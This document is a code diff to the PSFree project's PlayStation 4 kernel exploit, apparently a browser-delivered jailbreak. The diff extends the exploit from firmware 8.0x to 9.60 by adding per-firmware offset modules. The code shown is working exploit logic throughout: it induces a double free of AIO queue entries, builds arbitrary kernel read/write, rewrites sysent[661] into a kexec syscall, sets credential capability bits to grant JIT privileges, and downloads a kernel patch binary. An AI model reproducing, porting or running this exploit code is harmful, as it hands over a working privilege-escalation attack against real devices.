@@ -1,4 +1,5 @@
 /* Copyright (C) 2025 anonymous
+
 This file is part of PSFree.
 
 PSFree is free software: you can redistribute it and/or modify
@@ -24,21 +25,29 @@ along with this program.  If not, see <https://www.gnu.org/licenses/>.  */
 // * RESTORE - code will repair kernel panic vulnerability
 // * MEMLEAK - memory leaks that our code will induce
 
-import { Int } from '/module/int64.mjs';
-import { mem } from '/module/mem.mjs';
-import { log, die, hex, hexdump } from '/module/utils.mjs';
-import { cstr, jstr } from '/module/memtools.mjs';
-import { page_size, context_size } from '/module/offset.mjs';
-import { Chain } from '/module/chain.mjs';
+import { Int } from './module/int64.mjs';
+import { mem } from './module/mem.mjs';
+import { clear_log, log, die, hex, hexdump } from './module/utils.mjs';
+import { cstr, jstr } from './module/memtools.mjs';
+import { page_size, context_size } from './module/offset.mjs';
+import { Chain } from './module/chain.mjs';
 
 import {
     View1, View2, View4,
     Word, Long, Pointer,
     Buffer,
-} from '/module/view.mjs';
+} from './module/view.mjs';
 
-import * as rop from '/module/chain.mjs';
-import * as config from '/config.mjs';
+import * as rop from './module/chain.mjs';
+import * as config from './config.mjs';
+
+// Static imports for firmware configurations
+import * as fw_ps4_800 from './lapse/ps4/800.mjs';
+import * as fw_ps4_850 from './lapse/ps4/850.mjs';
+import * as fw_ps4_852 from './lapse/ps4/852.mjs';
+import * as fw_ps4_900 from './lapse/ps4/900.mjs';
+import * as fw_ps4_903 from './lapse/ps4/903.mjs';
+import * as fw_ps4_950 from './lapse/ps4/950.mjs';
 
 const t1 = performance.now();
 
@@ -61,6 +70,35 @@ const [is_ps4, version] = (() => {
 
     return [is_ps4, version];
 })();
+
+// Set per-console/per-firmware offsets
+const fw_config = (() => {
+    if (is_ps4) {
+        if (0x800 <= version && version < 0x850) { // 8.00, 8.01, 8.03
+            return fw_ps4_800;
+        } else if (0x850 <= version && version < 0x852) { // 8.50
+            return fw_ps4_850;
+        } else if (0x852 <= version && version < 0x900) { // 8.52
+            return fw_ps4_852;
+        } else if (0x900 <= version && version < 0x903) { // 9.00
+            return fw_ps4_900;
+        } else if (0x903 <= version && version < 0x950) { // 9.03, 9.04
+            return fw_ps4_903;
+        } else if (0x950 <= version && version < 0x1000) { // 9.50, 9.51, 9.60
+            return fw_ps4_950;
+        }
+    } else {
+        // TODO: PS5
+    }
+    throw new RangeError(`unsupported console/firmware: ps${is_ps4 ? '4' : '5'}, version: ${hex(version)}`);
+})();
+
+const pthread_offsets = fw_config.pthread_offsets;
+const off_kstr = fw_config.off_kstr;
+const off_cpuid_to_pcpu = fw_config.off_cpuid_to_pcpu;
+const off_sysent_661 = fw_config.off_sysent_661;
+const jmp_rsi = fw_config.jmp_rsi;
+const patch_elf_loc = fw_config.patch_elf_loc;
 
 // sys/socket.h
 const AF_UNIX = 1;
@@ -143,16 +181,6 @@ let chain = null;
 async function init() {
     await rop.init();
     chain = new Chain();
-
-    // TODO assumes ps4 8.0x
-    const pthread_offsets = new Map(Object.entries({
-        'pthread_create' : 0x25610,
-        'pthread_join' : 0x27c60,
-        'pthread_barrier_init' : 0xa0e0,
-        'pthread_barrier_wait' : 0x1ee00,
-        'pthread_barrier_destroy' : 0xe180,
-        'pthread_exit' : 0x19eb0,
-    }));
 
     rop.init_gadget_map(rop.gadgets, pthread_offsets, rop.libkernel_base);
 }
@@ -1104,7 +1132,7 @@ function double_free_reqs1(
                     }
                 }
                 if (sd === null) {
-                    die("can't find sd that overwrote AIO queue entry");
+                    die('can\'t find sd that overwrote AIO queue entry');
                 }
                 log(`sd: ${sd}`);
 
@@ -1240,15 +1268,11 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
         die('test read of &"evf cv" failed');
     }
 
-    // TODO FW dependent parts! assume ps4 8.0x for now
-
-    const off_kstr = 0x7edcff;
     const kbase = kernel_addr.sub(off_kstr);
     log(`kernel base: ${kbase}`);
 
     log('\nmaking arbitrary kernel read/write');
     const cpuid = 7 - main_core;
-    const off_cpuid_to_pcpu = 0x228e6b0;
     const pcpu_p = kbase.add(off_cpuid_to_pcpu + cpuid*8);
     log(`cpuid_to_pcpu[${cpuid}]: ${pcpu_p}`);
     const pcpu = kread64(pcpu_p);
@@ -1486,7 +1510,7 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
 
 // FUNCTIONS FOR STAGE: PATCH KERNEL
 
-async function get_patches(url) {
+async function get_binary(url) {
     const response = await fetch(url);
     if (!response.ok) {
         throw Error(
@@ -1496,37 +1520,33 @@ async function get_patches(url) {
     return response.arrayBuffer();
 }
 
-// TODO 8.0x supported only
 async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     if (!is_ps4) {
-        throw RangeError('PS5 kernel patching unsupported');
+        throw RangeError('ps5 kernel patching unsupported');
     }
-    if (!(0x800 <= version < 0x850)) {
+    if (!(0x800 <= version && version < 0x1000)) { // 8.00, 8.01, 8.03, 8.50, 8.52, 9.00, 9.03, 9.04, 9.50, 9.51, 9.60
         throw RangeError('kernel patching unsupported');
     }
 
     log('change sys_aio_submit() to sys_kexec()');
     // sysent[661] is unimplemented so free for use
-    const offset_sysent_661 = 0x11040c0;
-    const sysent_661 = kbase.add(offset_sysent_661);
+    const sysent_661 = kbase.add(off_sysent_661);
     // .sy_narg = 6
     kmem.write32(sysent_661, 6);
     // .sy_call = gadgets['jmp qword ptr [rsi]']
-    kmem.write64(sysent_661.add(8), kbase.add(0xe629c));
+    kmem.write64(sysent_661.add(8), kbase.add(jmp_rsi));
     // .sy_thrcnt = SY_THR_STATIC
     kmem.write32(sysent_661.add(0x2c), 1);
 
     log('add JIT capabilities');
-    // TODO just set the bits for JIT privs
+    // TODO: Just set the bits for JIT privs
     // cr_sceCaps[0]
     kmem.write64(p_ucred.add(0x60), -1);
     // cr_sceCaps[1]
     kmem.write64(p_ucred.add(0x68), -1);
 
-    const buf = await get_patches('/kpatch/80x.elf');
-    // FIXME handle .bss segment properly
-    // assume start of loadable segments is at offset 0x1000
-    const patches = new View1(await buf, 0x1000);
+    const buf = await get_binary(patch_elf_loc);
+    const patches = new View1(await buf);
     let map_size = patches.size;
     const max_size = 0x10000000;
     if (map_size > max_size) {
@@ -1535,6 +1555,7 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     if (map_size === 0) {
         die('patch file size is zero');
     }
+    log(`kpatch size: ${map_size} bytes`);
     map_size = map_size+page_size & -page_size;
 
     const prot_rwx = 7;
@@ -1673,7 +1694,7 @@ export async function kexploit() {
     get_our_affinity(main_mask);
     log(`main_mask: ${main_mask}`);
 
-    log("setting main thread's priority");
+    log('setting main thread\'s priority');
     sysi('rtprio_thread', RTP_SET, 0, rtprio.addr);
 
     const [block_fd, unblock_fd] = (() => {
